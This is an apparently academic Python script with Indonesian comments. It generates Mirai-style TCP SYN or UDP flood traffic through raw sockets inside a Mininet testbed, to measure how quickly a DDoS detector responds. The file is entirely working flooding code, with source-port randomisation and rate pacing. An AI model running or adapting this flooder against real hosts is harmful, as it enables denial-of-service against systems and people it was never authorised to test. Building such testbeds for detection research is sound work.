#!/usr/bin/env python3
"""
Generator trafik serangan (flooding) berbasis Scapy + raw socket.

Simulasi flooding Mirai-style: banjir paket inisiasi koneksi dari satu host
ke target. Dipakai DI DALAM host Mininet, contoh:

    h1 /home/<user>/ddos-venv/bin/python flood_scapy.py \
        --target 10.0.0.5 --proto tcp --port 80 --duration 10

Catatan implementasi:
- Scapy dipakai HANYA untuk merender bytes paket (mudah dibaca).
- Pengiriman memakai raw socket (IP_HDRINCL) dalam loop murni -> ribuan pps,
  karena scapy send() tingkat tinggi hanya ~20 pps di lingkungan virtual
  (WSL2) dan tidak cukup untuk memicu deteksi berbasis rate.
- Source port dirandom ulang tiap BATCH_SIZE paket -> tetap murah namun
  tiap batch terlihat sebagai koneksi baru (mirip perilaku botnet Mirai).
"""

import argparse
import random
import socket
import time

from scapy.all import IP, TCP, UDP, conf


def render_packet(proto, target, port):
    """Render satu paket inisiasi koneksi menjadi bytes siap kirim."""
    if proto == 'tcp':
        # SYN murni = permintaan koneksi baru
        pkt = IP(dst=target) / TCP(sport=random.randint(1024, 65535),
                                   dport=port, flags='S')
    else:
        pkt = IP(dst=target) / UDP(sport=random.randint(1024, 65535),
                                   dport=port)
    return bytes(pkt)


def main():
    ap = argparse.ArgumentParser(description='Flooder sederhana (PoC skripsi)')
    ap.add_argument('--target', required=True, help='IP tujuan (victim)')
    ap.add_argument('--proto', choices=['tcp', 'udp'], default='tcp')
    ap.add_argument('--port', type=int, default=80)
    ap.add_argument('--duration', type=float, default=10.0,
                    help='lama serangan (detik)')
    ap.add_argument('--rate', type=float, default=0,
                    help='paket/detik; 0 = secepat mungkin')
    args = ap.parse_args()

    conf.verb = 0

    # Raw socket dengan IP header sendiri (butuh root; di Mininet sudah root)
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    payload = render_packet(args.proto, args.target, args.port)
    delay = 1.0 / args.rate if args.rate > 0 else 0

    sent = 0
    t_start = time.time()
    deadline = t_start + args.duration

    # PENANDA MULAI (dipakai runner eksperimen).
    # Dicetak tepat SEBELUM paket pertama dikirim, dengan flush, agar runner
    # dapat menetapkan t0 pengukuran detection_time TANPA ikut menghitung
    # waktu import scapy + pembuatan raw socket (0,5-1 s di WSL). Baris ini
    # hanya menambah output; perilaku pengiriman tidak berubah.
    #
    # t0_epoch = jam dinding saat paket pertama dijadwalkan. Runner memakai
    # angka ini sebagai t0 (BUKAN saat ia berhasil membaca berkas), sehingga
    # jeda pembacaan berkas di WSL/drvfs tidak lagi memperkecil detection_time.
    print(f'[flood] started proto={args.proto} '
          f'target={args.target}:{args.port} '
          f'rate={args.rate:.0f}pps duration={args.duration:.0f}s '
          f't0_epoch={t_start:.6f}',
          flush=True)

    try:
        while True:
            now = time.time()
            if now >= deadline:
                break
            # ganti source port secara berkala (koneksi "baru" per batch)
            if sent % 256 == 0:
                payload = render_packet(args.proto, args.target, args.port)
            sock.sendto(payload, (args.target, args.port))
            sent += 1
            if delay:
                # PACING JADWAL ABSOLUT: target waktu paket ke-(sent+1)
                # dihitung dari t_start, bukan sleep(1/rate) per paket.
                # Kelebihan: drift tidak menumpuk, dan tidur hanya dilakukan
                # bila kita masih lebih cepat dari jadwal -> achieved rate
                # lebih dekat ke --rate pada beban tinggi.
                ahead = (t_start + sent * delay) - time.time()
                if ahead > 0:
                    time.sleep(ahead)
    except KeyboardInterrupt:
        pass

    elapsed = time.time() - t_start
    print(f'[flood] proto={args.proto} target={args.target}:{args.port} '
          f'terkirim={sent} pkt dalam {elapsed:.1f}s '
          f'(~{sent / max(elapsed, 0.001):.0f} pps)')


if __name__ == '__main__':
    main()
